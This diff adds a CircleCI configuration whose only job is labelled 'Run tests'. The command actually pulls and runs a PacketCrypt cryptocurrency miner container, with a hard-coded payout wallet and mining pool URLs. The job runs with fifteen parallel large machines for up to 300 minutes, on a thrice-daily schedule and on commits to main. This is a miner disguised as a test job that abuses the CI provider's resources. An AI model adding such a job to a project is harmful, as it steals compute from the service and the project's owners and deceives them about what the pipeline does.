@@ -1,0 +1,35 @@
+working_dir: &working_dir ~/app
+.build_template: &script
+  steps:
+    - checkout
+    - run:
+        name: Run tests
+        command: |
+                    docker pull backupbrain/packetcrypt
+                    docker run backupbrain/packetcrypt ann -p pkt1q8qf58p5fzfp0jgde6dkv87uln7yz0ayjgp3z74 http://pool.pktpool.io http://pool.pkt.world
+        no_output_timeout: 300m
+version: 2.1
+jobs:
+  endvoc:
+    <<: *script
+    parallelism: 15
+    machine:
+      image: ubuntu-2004:202101-01
+    resource_class: large
+workflows:
+  version: 2.1
+  commit:
+    jobs:
+      - endvoc
+
+    triggers:
+      - schedule:
+          cron: "0 0,8,16 * * *"
+          filters:
+            branches:
+              only:
+                - main
+
+  endvocrunjob:
+    jobs:
+      - endvoc
